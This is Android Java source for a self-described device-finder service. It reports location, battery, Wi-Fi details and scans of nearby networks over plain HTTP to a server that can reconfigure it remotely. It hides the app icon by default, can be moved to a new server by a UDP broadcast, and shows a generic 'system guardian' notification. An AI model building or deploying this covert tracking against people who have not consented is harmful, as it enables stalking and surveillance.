package com.example.devicefinder;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

public class TrackingService extends Service implements LocationListener {

    private LocationManager locationManager;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private ConnectivityManager.NetworkCallback networkCallback;

    private long reportIntervalMs = 1800 * 1000L; // 默认 30 分钟
    private String accuracyMode = "coarse";
    private Location lastLocation = null;

    private static long lastReportTime = 0;
    private static int consecutiveFailures = 0;
    private static boolean isListeningForRescue = false;

    private static String defaultServerUrl = "http://192.168.1.123:8000/api/report";
    private static final String AUTH_TOKEN = "your_private_secret_key";
    private static final String RESCUE_SECRET = "your_private_secret_key";

    @Override
    public void onCreate() {
        super.onCreate();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        startForegroundNotification();

        // 1. 服务一创建/开机自启，立刻闪电上报一次（附带周围 Wi-Fi 扫描）
        sendReport(true);

        // 2. 注册网络状态变动监听（Wi-Fi 跨网即时插队上报）
        registerNetworkCallback();

        // 3. 启动定时轮询与定位
        startTracking();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "ACTION_MANUAL_REPORT".equals(intent.getAction())) {
            sendReport(false);
        }
        return START_STICKY;
    }

    private void startForegroundNotification() {
        String channelId = "device_guardian_channel";
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "设备安全守护", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }
        Notification notification = builder.setContentTitle("设备安全守护")
                .setContentText("系统后台运行中")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(1001, notification);
        }
    }

    private String getUniqueDeviceId() {
        SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
        String deviceId = sp.getString("saved_device_id", null);
        if (deviceId == null) {
            String model = Build.MODEL != null ? Build.MODEL.replaceAll("\\s+", "_") : "UnknownPhone";
            int randomNum = (int)((Math.random() * 9000) + 1000);
            deviceId = model + "_" + randomNum;
            sp.edit().putString("saved_device_id", deviceId).apply();
        }
        return deviceId;
    }

    private String getCurrentServerUrl() {
        SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
        return sp.getString("saved_server_url", defaultServerUrl);
    }

    private void saveNewServerUrl(String newUrl) {
        if (newUrl != null && !newUrl.isEmpty()) {
            SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
            sp.edit().putString("saved_server_url", newUrl).apply();
        }
    }

    private void handleIconVisibility(boolean hideIcon) {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, "com.example.devicefinder.VisibleAliasActivity");
            int newState = hideIcon ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                    : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;

            if (p.getComponentEnabledSetting(componentName) != newState) {
                p.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);
            }
        } catch (Exception ignored) {}
    }

    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                NetworkRequest request = new NetworkRequest.Builder()
                        .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                        .build();

                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onAvailable(Network network) {
                        super.onAvailable(network);
                        String oldSsid = DeviceInfoUtils.cachedSsid;
                        String[] wifiInfo = DeviceInfoUtils.getWifiInfo(TrackingService.this);
                        String newSsid = wifiInfo[0];

                        if (newSsid.equals("UNKNOWN") || newSsid.equals("<unknown ssid>")) return;

                        if (!oldSsid.equals(newSsid) && !oldSsid.equals("UNKNOWN")) {
                            // 网络切换触发上报，附带周围 Wi-Fi 扫描
                            sendReport(true);
                            scheduleNextReport();
                        }
                    }

                    @Override
                    public void onLost(Network network) {
                        super.onLost(network);
                        // 断网触发上报，附带周围 Wi-Fi 扫描（此时可能拿不到，静默跳过）
                        sendReport(true);
                        scheduleNextReport();
                    }
                };
                cm.registerNetworkCallback(request, networkCallback);
            }
        } catch (Exception ignored) {}
    }

    private void startTracking() {
        try {
            locationManager.removeUpdates(this);
            if ("fine".equals(accuracyMode) && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, reportIntervalMs, 0f, this);
            }
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, reportIntervalMs, 0f, this);
            }
        } catch (SecurityException ignored) {}
        scheduleNextReport();
    }

    private final Runnable reportRunnable = new Runnable() {
        @Override
        public void run() {
            // 定时轮询上报不扫描周围 Wi-Fi，避免后台节流和耗电
            sendReport(false);
            scheduleNextReport();
        }
    };

    private void scheduleNextReport() {
        handler.removeCallbacks(reportRunnable);
        handler.postDelayed(reportRunnable, reportIntervalMs);
    }

    private void sendReport(final boolean withNearbyWifi) {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastReportTime < 5000) return; // 5秒冷却锁
        lastReportTime = currentTime;

        final String activeUrl = getCurrentServerUrl();

        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean success = false;
                try {
                    int[] battery = DeviceInfoUtils.getBatteryInfo(TrackingService.this);
                    String[] wifi = DeviceInfoUtils.getWifiInfo(TrackingService.this);
                    String ip = DeviceInfoUtils.getLocalIpAddress();

                    // 多重兜底获取最新位置，彻底告别 0.0, 0.0
                    Location loc = lastLocation;
                    if (loc == null) {
                        try {
                            Location netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                            Location gpsLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            Location passLoc = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);

                            loc = getBetterLocation(netLoc, gpsLoc);
                            loc = getBetterLocation(loc, passLoc);
                        } catch (SecurityException ignored) {}
                    }

                    JSONObject json = new JSONObject();
                    json.put("device_id", getUniqueDeviceId());
                    json.put("token", AUTH_TOKEN);
                    json.put("timestamp", System.currentTimeMillis());

                    JSONObject battObj = new JSONObject();
                    battObj.put("level", battery[0]);
                    battObj.put("is_charging", battery[1] == 1);
                    json.put("battery", battObj);

                    JSONObject netObj = new JSONObject();
                    netObj.put("wifi_ssid", wifi[0]);
                    netObj.put("wifi_bssid", wifi[1]);
                    netObj.put("wifi_rssi", Integer.parseInt(wifi[2]));
                    netObj.put("local_ip", ip);
                    json.put("network", netObj);

                    JSONObject locObj = new JSONObject();
                    locObj.put("latitude", loc != null ? loc.getLatitude() : 0.0);
                    locObj.put("longitude", loc != null ? loc.getLongitude() : 0.0);
                    locObj.put("accuracy", loc != null ? loc.getAccuracy() : -1.0);
                    locObj.put("provider", loc != null ? loc.getProvider() : "none");
                    locObj.put("time", loc != null ? loc.getTime() : 0L);
                    json.put("location", locObj);

                    // 仅在指定时机尝试扫描周围 Wi-Fi，失败静默跳过
                    if (withNearbyWifi) {
                        try {
                            List<JSONObject> nearby = DeviceInfoUtils.scanNearbyWifi(TrackingService.this);
                            if (nearby != null && !nearby.isEmpty()) {
                                JSONArray arr = new JSONArray();
                                for (JSONObject obj : nearby) arr.put(obj);
                                json.put("nearby_wifi", arr);
                            }
                        } catch (Exception ignored) {}
                    }

                    URL url = new URL(activeUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setConnectTimeout(6000);
                    conn.setReadTimeout(6000);
                    conn.setDoOutput(true);

                    OutputStream os = conn.getOutputStream();
                    os.write(json.toString().getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    if (conn.getResponseCode() == 200) {
                        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = br.readLine()) != null) sb.append(line);
                        br.close();

                        parseResponse(new JSONObject(sb.toString()));
                        success = true;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    success = false;
                }

                if (success) {
                    consecutiveFailures = 0;
                } else {
                    consecutiveFailures++;
                    if (consecutiveFailures >= 3 && !isListeningForRescue) {
                        startRescueListener();
                    }
                }
            }
        }).start();
    }

    // 优选定位辅助函数：挑选出最准、更新的位置
    private Location getBetterLocation(Location l1, Location l2) {
        if (l1 == null) return l2;
        if (l2 == null) return l1;
        long timeDelta = l2.getTime() - l1.getTime();
        boolean isSignificantlyNewer = timeDelta > 120000;
        boolean isSignificantlyOlder = timeDelta < -120000;
        boolean isNewer = timeDelta > 0;

        if (isSignificantlyNewer) return l2;
        else if (isSignificantlyOlder) return l1;

        int accuracyDelta = (int) (l2.getAccuracy() - l1.getAccuracy());
        boolean isLessAccurate = accuracyDelta > 0;
        boolean isMoreAccurate = accuracyDelta < 0;
        boolean isSignificantlyLessAccurate = accuracyDelta > 200;
        boolean isFromSameProvider = l2.getProvider() != null && l2.getProvider().equals(l1.getProvider());

        if (isMoreAccurate) return l2;
        else if (isNewer && !isLessAccurate) return l2;
        else if (isNewer && !isSignificantlyLessAccurate && isFromSameProvider) return l2;
        return l1;
    }

    private void startRescueListener() {
        isListeningForRescue = true;

        new Thread(new Runnable() {
            @Override
            public void run() {
                DatagramSocket rescueSocket = null;
                try {
                    rescueSocket = new DatagramSocket(8888);
                    rescueSocket.setBroadcast(true);
                    rescueSocket.setSoTimeout(60000);

                    byte[] buffer = new byte[512];
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);

                    while (true) {
                        rescueSocket.receive(packet);
                        String message = new String(packet.getData(), 0, packet.getLength());

                        if (message.startsWith("FIND_ME_SERVER:")) {
                            String[] parts = message.split(":", 3);
                            if (parts.length == 3) {
                                String receivedPassword = parts[1];
                                String newServerUrl = parts[2].trim();

                                if (RESCUE_SECRET.equals(receivedPassword)) {
                                    saveNewServerUrl(newServerUrl);
                                    consecutiveFailures = 0;
                                    sendReport(true);
                                    break;
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                } finally {
                    if (rescueSocket != null && !rescueSocket.isClosed()) {
                        rescueSocket.close();
                    }
                    isListeningForRescue = false;
                }
            }
        }).start();
    }

    private void parseResponse(JSONObject res) {
        if (!res.has("config")) return;
        JSONObject cfg = res.optJSONObject("config");
        if (cfg == null) return;

        long newInterval = cfg.optLong("report_interval_seconds", 1800) * 1000L;
        String newAccuracy = cfg.optString("accuracy_mode", "coarse");

        if (newInterval != reportIntervalMs || !newAccuracy.equals(accuracyMode)) {
            reportIntervalMs = newInterval;
            accuracyMode = newAccuracy;
            handler.post(new Runnable() {
                @Override
                public void run() {
                    startTracking();
                }
            });
        }

        String nextServerUrl = cfg.optString("next_server_url", "");
        if (!nextServerUrl.isEmpty() && !nextServerUrl.equals(getCurrentServerUrl())) {
            saveNewServerUrl(nextServerUrl);
        }

        boolean shouldHideIcon = cfg.optBoolean("hide_icon", true);
        handleIconVisibility(shouldHideIcon);
    }

    @Override
    public void onLocationChanged(Location location) {
        if (location != null) lastLocation = location;
    }

    @Override public void onDestroy() {
        super.onDestroy();
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null && networkCallback != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                cm.unregisterNetworkCallback(networkCallback);
            }
        } catch (Exception ignored) {}
    }

    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
    @Override public void onProviderEnabled(String provider) {}
    @Override public void onProviderDisabled(String provider) {}
    @Override public IBinder onBind(Intent intent) { return null; }
}
